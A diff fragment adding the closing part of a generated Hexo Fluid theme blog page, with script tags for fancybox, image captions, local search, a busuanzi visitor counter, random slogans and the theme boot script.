+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
